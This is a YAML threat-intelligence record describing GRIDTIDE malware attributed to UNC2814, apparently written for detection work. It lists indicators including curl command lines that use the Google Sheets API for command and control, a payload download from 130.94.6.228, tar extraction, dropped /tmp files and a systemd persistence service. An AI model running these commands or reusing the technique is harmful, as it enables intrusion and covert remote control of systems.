description: GRIDTIDE malware uses Google Sheets API for command and control, downloads
  malicious components from a compromised server, and employs persistence mechanisms
  via systemd services.
attribution: UNC2814
malware_families:
- GRIDTIDE
TTPs:
  processes:
  - systemd
  - curl
  - tar
  - gzip
  commandline:
  - curl -ik https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values/A1?valueRenderOption=FORMULA
  - curl -ik https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values:batchClear
  - curl -ik https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values:batchUpdate
  - curl -ik http://130.94.6.228/apt.tar.gz
  - tar -xzf apt.tar.gz
  powershell: []
  scripting_engine: []
  registry_keys: []
  image_load: []
  network_connections:
  - systemd->curl->https://sheets.googleapis.com:443/v4/spreadsheets/<GoogleSheetID>/values/A1?valueRenderOption=FORMULA
  - systemd->curl->http://130.94.6.228/apt.tar.gz
  file_activity:
  - /etc/systemd/system/xapt.service
  - /tmp/apt.tar.gz
  - /tmp/update.tar.gz
  - /tmp/amp.tar.gz
  - /tmp/fire
  - /tmp/hamcore.se2
  - /tmp/vpn_bridge.config
  - /tmp/pmp.cfg
  persistence:
  - systemd service file creation for GRIDTIDE
  process_relations:
  - systemd->curl
